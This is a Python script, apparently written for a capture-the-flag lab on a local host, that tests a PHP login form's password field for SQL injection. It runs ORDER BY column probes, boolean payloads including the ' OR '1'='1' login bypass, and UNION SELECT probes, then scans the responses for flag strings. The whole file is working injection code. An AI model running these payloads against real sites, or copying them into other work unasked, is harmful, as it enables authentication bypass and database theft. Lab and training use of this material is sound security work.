import requests
import re

target = "http://127.0.0.1:32895/index.php"

print("[*] Testing password field for SQL injection\n")

# Test password field with ORDER BY
print("[1] Testing ORDER BY in password field:")
for i in range(1, 12):
    r = requests.get(target, params={'username': 'admin', 'password': f"' ORDER BY {i}-- -"})
    print(f"  ORDER BY {i}: Length={len(r.text)}", end="")
    
    if len(r.text) != 3173:
        print(f" [DIFFERENT!]")
    
    # Check for errors
    if 'error' in r.text.lower() or 'unknown column' in r.text.lower():
        print(f" [ERROR DETECTED]")
        print(f"    Response: {r.text[:300]}")
        break
    else:
        print()

print("\n[2] Testing boolean conditions in password:")
test_cases = [
    ("' OR '1'='1'-- -", "TRUE bypass"),
    ("' OR '1'='2'-- -", "FALSE bypass"),
    ("' AND 1=1-- -", "TRUE condition"),
    ("' AND 1=0-- -", "FALSE condition"),
]

for payload, desc in test_cases:
    r = requests.get(target, params={'username': 'admin', 'password': payload})
    print(f"[{desc}] Payload: {payload}")
    print(f"  Length: {len(r.text)}")
    
    msg_match = re.search(r'<center><h3>(.*?)</h3></center>', r.text)
    if msg_match:
        print(f"  Message: {msg_match.group(1)}")
    
    if 'FLAG{' in r.text:
        flags = re.findall(r'FLAG\{[^}]+\}', r.text)
        print(f"  [!!!] FLAG: {flags[0]}")
    print()

print("[3] Testing UNION in password:")
for num_cols in [1, 5, 9, 10]:
    cols = ','.join(['NULL'] * num_cols)
    payload = f"' UNION SELECT {cols}-- -"
    r = requests.get(target, params={'username': 'admin', 'password': payload})
    print(f"  UNION with {num_cols} columns: Length={len(r.text)}")
    
    if 'FLAG{' in r.text:
        flags = re.findall(r'FLAG\{[^}]+\}', r.text)
        print(f"    [!!!] FLAG: {flags[0]}")

